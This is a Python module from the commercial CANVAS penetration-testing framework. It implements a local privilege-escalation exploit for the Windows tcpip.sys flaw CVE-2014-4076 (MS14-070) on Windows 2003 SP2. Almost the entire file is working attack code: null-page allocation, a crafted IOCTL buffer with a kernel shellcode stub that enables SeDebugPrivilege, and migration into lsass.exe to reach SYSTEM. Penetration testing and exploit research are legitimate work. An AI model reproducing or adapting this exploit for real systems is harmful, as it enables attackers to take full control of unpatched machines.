#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2006
# http://www.immunityinc.com/CANVAS/ for more information

#
# CANVAS Exploit
#

import sys
import struct

if "." not in sys.path:
    sys.path.append(".")

import canvasengine

from exploitutils import *
from ExploitTypes.windowsLocalExploit import WindowsLocalExploit
from shelllistener import *
from MOSDEF import mosdef


NAME                         = 'ms14_070'
DESCRIPTION                  = 'Windows tcpip.sys Local Privilege Escalation'

DOCUMENTATION                = {}
DOCUMENTATION['VENDOR']      = 'Microsoft'
DOCUMENTATION['Date public'] = '11/11/2014'
DOCUMENTATION['CVE Name']    = 'CVE-2014-4076'
DOCUMENTATION['CVE Url']     = 'https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-4076'
DOCUMENTATION['CVSS']        = 7.2
DOCUMENTATION['References']  = 'https://technet.microsoft.com/en-us/library/security/ms14-070.aspx'

VERSION                      = '1.0'

PROPERTY                     = {}
PROPERTY['TYPE']             = 'Exploit'
PROPERTY['SITE']             = 'Local'
PROPERTY['ARCH']             = [['Windows']]
PROPERTY['VERSION']          = ['2003']

DOCUMENTATION["NOTES"]       = """

Tested on:
- Windows 2003 Standard Edition x86 SP2 English

Usage:
Win32/MOSDEF$ runmodule ms14_070
"""

class theexploit(WindowsLocalExploit):
    def __init__(self):
        WindowsLocalExploit.__init__(self)
        self.name           = NAME
        self.result         = 0
        self.device_name    = "\\\\.\\tcp"
        self.ioctl_code     = 0x00120028
        self.ioctl_buf_addr = 0x0
        self.ioctl_buf_len  = 0
        self.ioctl_buf      = ""
        self.exploit_failed = False

    def create_shellcode(self):
        shellcode = self.enable_sedebugprivilege_stub_32()
        return shellcode

    def DeviceIoControlFile(self, hDevice, IoControlCode, InBuffer="", OutBufferSize=0):
        lvars                  = {}
        lvars['hDevice']       = hDevice
        lvars['IoControlCode'] = IoControlCode
        lvars['InBufferSize']  = len(InBuffer)
        lvars['OutBufferSize'] = OutBufferSize

        code = """

        #import "remote", "ntdll.dll|ZwDeviceIoControlFile" as "DeviceIoControlFile"
        #import "remote", "kernel32.dll|LocalAlloc" as "LocalAlloc"
        #import "remote", "kernel32.dll|LocalFree" as "LocalFree"

        #import "local", "readdatafromself" as "readdatafromself"
        #import "local",  "sendint" as "sendint"

        #import "int",    "hDevice" as "hDevice"
        #import "int",    "IoControlCode" as "IoControlCode"
        #import "int",    "InBufferSize" as "InBufferSize"
        #import "int",    "OutBufferSize" as "OutBufferSize"

        #define LPTR 0x0040 // LMEM_FIXED|LMEM_ZEROINIT

        void main() {
            int ret;
            int cb;

            void *in_buffer;
            void *out_buffer;
            void *IoStatusBlock;

            in_buffer = 0;
            out_buffer = 0;

            //typedef struct _IO_STATUS_BLOCK {
            //  union {
            //    NTSTATUS Status;
            //    PVOID    Pointer;
            // };
            //  ULONG_PTR Information;
            //}

            IoStatusBlock = LocalAlloc(LPTR, 0x8);
            if (IoStatusBlock == 0) {
                return;
            }

            // First allocate memory for input buffer, when needed
            if (InBufferSize > 0) {
                in_buffer = LocalAlloc(LPTR, InBufferSize);
                sendint(in_buffer);

                if (in_buffer == 0) {
                    return;
                }
            }

            // Next, allocate memory for output buffer, when needed
            if (OutBufferSize > 0) {
                out_buffer = LocalAlloc(LPTR, OutBufferSize);
                sendint(out_buffer);

                if (out_buffer == 0) {
                    if (InBufferSize > 0) {
                        LocalFree(in_buffer);
                    }

                    return;
                }
            }

            // Receive input buffer, when needed
            if (InBufferSize > 0) {
                readdatafromself(in_buffer, InBufferSize);
            }

            // Now, we do the call
            ret = DeviceIoControlFile(hDevice, 0, 0, 0, IoStatusBlock, IoControlCode, in_buffer, InBufferSize, out_buffer, OutBufferSize);

            // Free buffers
            if (OutBufferSize > 0) {
                LocalFree(out_buffer);
            }

            if (InBufferSize > 0) {
                LocalFree(in_buffer);
            }

            LocalFree(IoStatusBlock);

            sendint(ret);
        }
        """

        self.node.shell.clearfunctioncache()
        request = self.node.shell.compile(code, lvars)
        self.node.shell.sendrequest(request)

        if len(InBuffer) > 0:
            alloc_inp = self.node.shell.readint()

            if alloc_inp == 0:
                self.log_error('DeviceIoControlFile/LocalAlloc(InBufferSize: %d) failed, aborting' % len(InBuffer))
                self.node.shell.leave()
                return -1

            self.nlog('Allocated %d bytes at 0x%x' % (len(InBuffer), alloc_inp))

        if OutBufferSize > 0:
            alloc_out = self.node.shell.readint()

            if alloc_out == 0:
                self.log_error('DeviceIoControlFile/LocalAlloc(OutBufferSize: %d) failed, aborting' % OutBufferSize)
                self.node.shell.leave()
                return -1

            self.nlog('Allocated %d bytes at 0x%x' % (OutBufferSize, alloc_out))


        if len(InBuffer) > 0:
            self.nlog('Sending %d bytes (InBuffer)...' % len(InBuffer))
            self.node.shell.writebuf(InBuffer)

        ret = self.node.shell.readint()
        if ret != 0:
            self.log_error('DeviceIoControlFile failed with error 0x%x, aborting' % ret)

        self.node.shell.leave()
        return ret

    # Test to make sure the driver is accessible
    def test(self):
        if self.is_32bit_node():
            if self.has_wow64():
                self.log_error('This module does not currently support WoW64. Aborting.')
                return 0
            self.log_info("Running on 32-bit.")
        else:
            self.log_error('This module does not support node type: %s' % self.node.nodetype)
            return 0

        if not self.is_win2003sp2_node():
            return 0

        # CreateFile* constants
        FILE_SHARE_READ  = 0x1
        FILE_SHARE_WRITE = 0x2
        OPEN_EXISTING    = 0x3

        self.h_driver_device = self.node.shell.CreateFile(self.device_name,
                                                          FILE_SHARE_READ | FILE_SHARE_WRITE,
                                                          0,
                                                          0,
                                                          OPEN_EXISTING,
                                                          0)

        if self.h_driver_device <= 0:
            self.log_error("Driver Not Available. Exiting. Handle: 0x%08x" % self.h_driver_device)
            return 0
        else:
            self.log_info("Driver Available")

            if self.exploit_failed:
                self.node.shell.CloseHandle(self.h_driver_device)
            else:
                self.log_info("Handle: 0x%08x" % self.h_driver_device)

        return 1

    def run_attack(self,node):
        self.node = node

        # test for the driver
        ret = self.test()

        if not ret:
            return ret

        # allocate null page
        allocated_memory = node.shell.NtAllocateVirtualMemory(1)
        #if allocated_memory != 0:
        #    self.log("Failed to allocate null page. Error code 0x%x" % allocated_memory)
        #    return 0

        # build our privilege enabling shellcode
        shellcode = self.create_shellcode()

        data = struct.pack('<I',0)
        data += struct.pack('<I',0)
        data += struct.pack('<I',0)
        data += struct.pack('<I',0)
        # lea     eax, [esi+10h]
        # mov     edi, [eax]
        # ...
        # mov     ecx, [edi]
        data += 'A' * (0x10 - len(data))
        data += struct.pack('<I',0)
        data += 'A' * (0x28 - len(data))
        # ba443cf6 8b5e28          mov     ebx,dword ptr [esi+28h] ds:0023:00000028=41414141
        # ba443cf9 84db            test    bl,bl
        # ba443cfb 8845f8          mov     byte ptr [ebp-8],al
        # ba443cfe 0f89328a0100    jns     tcpip!SetAddrOptions+0x125 (ba45c736)
        # ba44dcfb 8845f8          mov     byte ptr [ebp-8],al
        # ba44dcfe 0f89328a0100    jns     tcpip!SetAddrOptions+0x125 (ba466736)
        # ba44dd04 f6c340          test    bl,40h
        # ba44dd07 7567            jne     tcpip!SetAddrOptions+0x9e (ba44dd70)
        # We need:
        #    Bit 1 of last byte = 1
        #    Bit 2 of last byte = 0
        data += struct.pack('<I',0x000000af)
        # ba44dd09 66837e3800      cmp     word ptr [esi+38h],0     ds:0023:00000038=53bb
        # ba44dd0e 7560            jne     tcpip!SetAddrOptions+0x9e (ba44dd70)

        data += 'A' * (0x38 - len(data))
        data += struct.pack('<I',0)
        data += 'A' * (0xEC - len(data))
        data += struct.pack('<I',0x1000)
        data += 'A' * (0x1000 - len(data))
        break_infinite_loop = """push %eax
        push %ebx
        movl $0x28,%eax
        movl $0x0,%ebx
        movl %ebx,(%eax)
        pop %ebx
        pop %eax
        """
        data += mosdef.assemble(break_infinite_loop, 'x86')
        data += shellcode

        self.memcpy(0x0, data)
        # Conditions on the buffer
        # IO_STACK_LOCATION->Parameters.InputBufferLength >= 0xC
        # inputBufferLen >= 0x18
        # TdiSetInformationEx constrains
        # Buffer + 4 == 0
        # Buffer + 8 != 0x100
        # Buffer + 8 == 0x200
        # Buffer + C == 0x200

        in_buffer = struct.pack('<I',0x400)
        in_buffer += struct.pack('<I',0)
        in_buffer += struct.pack('<I',0x200)
        in_buffer += struct.pack('<I',0x200)

        in_buffer += "A" * (0x14 - len(in_buffer))
        in_buffer += struct.pack('<I',0x0)
        in_buffer += "A" * 60

        self.nlog("Firing IOCTL")
        ret = self.DeviceIoControlFile(self.h_driver_device, self.ioctl_code, in_buffer,0)
        self.nlog("IOCTL sent")
        self.node.shell.CloseHandle(self.h_driver_device)

        if ret != 0:
            self.log_error("Exploit failed, aborting")
            return 0

        if self.seDebugPrivilege_enabled():
            self.log_info('ring0 stub executed correctly')
            self.nlog('Migrating to LSASS')

            migrate = self.engine.getModuleExploit("mosdefmigrate")
            migrate.link(self)
            migrate.argsDict['pid'] = 'lsass.exe'
            ret = migrate.run()

            if not ret:
                self.log_error("Failed to migrate to LSASS")
                ret = 0
            else:
                # just to be sure
                if self.compromised():
                    self.log_info("Compromised")
                    ret = 1
        else:
            # failed to get a handle to lsass.exe our exploit failed
            self.log_error("Failed to exploit target")
            ret = 0

        return ret

    def run(self):
        self.setInfo('%s (in progress)'%(NAME))
        success = 0

        for node in self.argsDict['passednodes']:
            self.node = node
            if not self.is_32bit_node():
                self.log_error('This module only supports 32 bits nodes')

            if not self.is_win2003sp2_node():
                self.nlog("This exploit only supports Windows 2003 SP2")
                return 0

            ret = self.run_attack(node)
            if ret == 1:
                self.log_info("Successfully migrated to LSASS. We are now SYSTEM")
                success = 1
            else:
                self.exploit_failed = True

        return success


if __name__=='__main__':
    print 'This Windows local module is meant to be run only within CANVAS'
